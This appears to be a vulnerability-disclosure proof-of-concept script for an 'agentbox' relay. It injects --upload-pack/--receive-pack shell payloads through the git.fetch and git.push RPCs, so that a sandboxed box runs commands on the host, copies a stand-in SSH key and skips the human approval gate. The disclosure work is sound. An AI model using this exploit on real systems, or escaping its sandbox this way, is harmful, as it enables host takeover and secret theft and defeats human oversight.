#!/usr/bin/env node
//
// PoC: Box -> Host RCE via the git.push / git.fetch relay RPCs
// ---------------------------------------------------------------------------
// The host relay executes git on the host on behalf of a box. It builds
//
//   argv = ['git','-C', worktree.hostMainRepo, op, remote, pushBranch,
//           ...sanitizeGitArgs(params.args)]           // server.ts:1588-1589
//   runHostCommand(argv)   // spawn(cmd, rest, { env: process.env })  server.ts:2079
//
// where `remote` (resolveRemote -> `remote ?? 'origin'`, git-refs.ts:47) and
// `args` (sanitizeGitArgs -> type-filter only, git-refs.ts:99) are BOX-CONTROLLED
// and unvalidated. git itself forks the program named by --upload-pack= (fetch)
// / --receive-pack= (push) for a path-like remote, so the box gets arbitrary
// host command execution -- with the host's env (SSH keys, git/cloud tokens).
//
// And the approval gate does not stop it:
//   * git.fetch never enters the gate at all -- the whole gate block is
//     `if (body.method === 'git.push')` (server.ts:563).
//   * git.push to the box's default `agentbox/<name>` scratch branch sets
//     bypassPushGate = isScratch = true (server.ts:584,593), so it is skipped.
//
// This PoC boots the REAL relay (packages/relay/dist) in host mode with the
// default in-memory store, registers a box, then -- presenting ONLY the box's
// own bearer token, exactly as an in-box agent would -- POSTs the two RPCs and
// shows arbitrary code running on the host and a host secret exfiltrated, with
// no approval prompt.
//
// Run: node poc.mjs   (from a built tree: `pnpm --filter @agentbox/relay... build`)

import { startRelayServer } from '../../../packages/relay/dist/index.js';
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, readFileSync, rmSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const red = (s) => `\x1b[1;31m${s}\x1b[0m`;
const green = (s) => `\x1b[1;32m${s}\x1b[0m`;
const say = (s) => console.log(`\n${bold('== ' + s + ' ==')}`);
const info = (s) => console.log('   ' + s);

const WORK = mkdtempSync(join(tmpdir(), 'agentbox-relay-poc.'));
const REPO = join(WORK, 'hostrepo');
const SECRET = join(WORK, 'host-home', '.ssh', 'id_ed25519'); // stand-in for a real host SSH key
const PWNED = join(WORK, 'PWNED_ON_HOST');
const STOLEN = join(WORK, 'STOLEN_HOST_KEY');
const BOX_TOKEN = 'box-token-' + '0'.repeat(48); // the per-box bearer the agent legitimately holds

// track whether the relay ever tried to gate/prompt for approval
let gatePromptSeen = false;
const logger = (line) => {
  if (/prompt|approv|gate|confirm|Allow git/i.test(line)) gatePromptSeen = true;
};

function git(args, cwd = REPO) {
  return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
}

async function main() {
  say('1. Set up a host repo + a host secret (what the box must not be able to reach)');
  mkdirSync(REPO, { recursive: true });
  mkdirSync(join(WORK, 'host-home', '.ssh'), { recursive: true });
  writeFileSync(SECRET, 'SUPER-SECRET-HOST-SSH-KEY-DO-NOT-LEAK\n');
  git(['init', '-q', '-b', 'main']);
  git(['config', 'user.email', 'dev@example.com']);
  git(['config', 'user.name', 'dev']);
  writeFileSync(join(REPO, 'README.md'), 'hello\n');
  git(['add', '.']);
  git(['-c', 'core.hooksPath=/dev/null', 'commit', '-qm', 'init']);
  git(['branch', 'agentbox/poc']); // the box's default scratch branch
  info(`host repo:   ${REPO}`);
  info(`host secret: ${SECRET} (contents: "${readFileSync(SECRET, 'utf8').trim()}")`);

  say('2. Boot the REAL relay in host mode (default in-memory store)');
  const relay = await startRelayServer({ port: 0, host: '127.0.0.1', mode: 'host', logger });
  const port = relay.server.address().port; // OS-assigned; handle.url echoes the requested 0
  const URL = `http://127.0.0.1:${port}`;
  info(`relay listening at ${URL}`);

  // Register the box exactly as the host CLI does at create time (loopback-only route).
  const reg = {
    boxId: 'poc-box',
    token: BOX_TOKEN,
    name: 'poc',
    kind: 'docker',
    worktrees: [{ containerPath: '/workspace', hostMainRepo: REPO, branch: 'agentbox/poc' }],
  };
  let r = await fetch(`${URL}/admin/register-box`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(reg),
  });
  info(`registered box (POST /admin/register-box -> ${r.status})`);

  // From here on we are the UNTRUSTED BOX: we hold only BOX_TOKEN.
  const rpc = (body, timeoutMs = 15000) =>
    fetch(`${URL}/rpc`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${BOX_TOKEN}` },
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(timeoutMs),
    });

  // The payload git will fork on the host. Inner double-quotes so it survives
  // git's own single-quoted `sh -c '<value> <path>'` local-transport wrapper.
  const payload = (via) =>
    `--upload-pack=sh -c "echo PWNED via ${via} > ${PWNED}; id >> ${PWNED}; ` +
    `hostname >> ${PWNED}; cp ${SECRET} ${STOLEN}"`;
  const payloadRecv = (via) =>
    `--receive-pack=sh -c "echo PWNED via ${via} > ${PWNED}; id >> ${PWNED}; ` +
    `hostname >> ${PWNED}; cp ${SECRET} ${STOLEN}"`;

  say('3a. Attack via git.fetch (NO approval gate at all)');
  info('box POSTs /rpc git.fetch with remote=<path> and args=[--upload-pack=sh -c "..."]');
  try {
    r = await rpc({
      method: 'git.fetch',
      params: { path: '/workspace', remote: join(WORK, 'evil-remote'), args: [payload('git.fetch')] },
    });
    info(`/rpc git.fetch -> HTTP ${r.status} (not 202/pending -> no human was asked)`);
  } catch (e) {
    info(`/rpc git.fetch threw ${e.name} (a hang would mean it blocked on a prompt)`);
  }
  const fetchWon = existsSync(PWNED);

  // reset markers to prove the push path independently
  rmSync(PWNED, { force: true });
  rmSync(STOLEN, { force: true });

  say('3b. Attack via git.push to the default agentbox/<name> scratch branch (gate bypassed)');
  info('box POSTs /rpc git.push with remote=<path> and args=[--receive-pack=sh -c "..."]');
  try {
    r = await rpc({
      method: 'git.push',
      params: { path: '/workspace', remote: join(WORK, 'evil-remote'), args: [payloadRecv('git.push scratch-branch')] },
    });
    info(`/rpc git.push -> HTTP ${r.status} (not 202/pending -> no human was asked)`);
  } catch (e) {
    info(`/rpc git.push threw ${e.name}`);
  }
  const pushWon = existsSync(PWNED);

  say('4. Result');
  const ok = fetchWon || pushWon;
  if (ok) {
    console.log(red('VULNERABLE') + ' -- a box with only its bearer token ran code on the HOST:');
    console.log();
    console.log(readFileSync(PWNED, 'utf8').split('\n').map((l) => '     ' + l).join('\n'));
    if (existsSync(STOLEN)) {
      console.log(red('     HOST SECRET EXFILTRATED') + ` -> ${STOLEN}:`);
      info(`     "${readFileSync(STOLEN, 'utf8').trim()}"`);
    }
    info(`git.fetch path executed: ${fetchWon}   git.push scratch-branch path executed: ${pushWon}`);
    info(`relay ever prompted/gated for approval: ${gatePromptSeen ? 'YES' : green('NO')}`);
  } else {
    console.log(green('NOT reproduced') + ' -- no host execution observed.');
  }

  await relay.close();
  rmSync(WORK, { recursive: true, force: true });
  process.exit(ok ? 0 : 1);
}

main().catch((e) => {
  console.error(e);
  process.exit(2);
});
